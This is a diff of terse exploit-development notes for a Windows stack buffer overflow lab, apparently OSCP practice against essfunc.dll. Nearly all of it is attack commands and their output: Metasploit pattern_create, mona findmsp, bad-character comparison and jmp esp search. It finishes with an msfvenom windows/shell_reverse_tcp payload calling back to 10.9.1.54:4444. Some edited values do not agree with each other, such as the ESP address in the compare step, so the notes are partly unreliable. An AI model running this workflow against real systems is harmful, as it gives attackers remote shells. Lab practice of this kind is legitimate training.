@@ -14,7 +14,7 @@ Set
 Step 2 - CONTROL EIP
 -------
 
-/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2000
+/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 700
 Insert to var payload 2.ControlEIP.py3
 --
 python3 2.ControlEIP.py3
@@ -22,7 +22,7 @@ python3 2.ControlEIP.py3
 
 run 
 --
-!mona findmsp -distance 700
+!mona findmsp -distance 1300
 --
 inside ID
 Log data, item 19
@@ -52,7 +52,7 @@ to get ESP register points
 --
 0198FA30
 --
-!mona compare -f C:\mona\oscp\bytearray.bin -a 0198FA30
+!mona compare -f C:\mona\oscp\bytearray.bin -a 0188FA30
 --
 
 \x07\x08\x2e\x2f\xa0\xa1
@@ -72,7 +72,7 @@ Step 4 - JUMP POINT
 -------
 
 --
-!mona jmp -r esp -cpb "\x00\x07\x2e\xa0"
+!mona jmp -r esp -cpb "\x00\x40\x11\xB8\xEE\x5F"
 --
 
 Log data, item 11
@@ -80,5 +80,5 @@ Log data, item 11
  Message=  0x625011af : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\admin\Desktop\vulnerable-apps\oscp\essfunc.dll)
 
 
-msfvenom -p windows/shell_reverse_tcp LHOST=10.9.1.54 LPORT=4444 EXITFUNC=thread -b "\x00\x07\x2e\xa0" -f py -v payload -o shellcode.py
+msfvenom -p windows/shell_reverse_tcp LHOST=10.9.1.54 LPORT=4444 EXITFUNC=thread -b "\x00\x40\x11\xB8\xEE\x5F" -f py -v payload -o shellcode.py
 
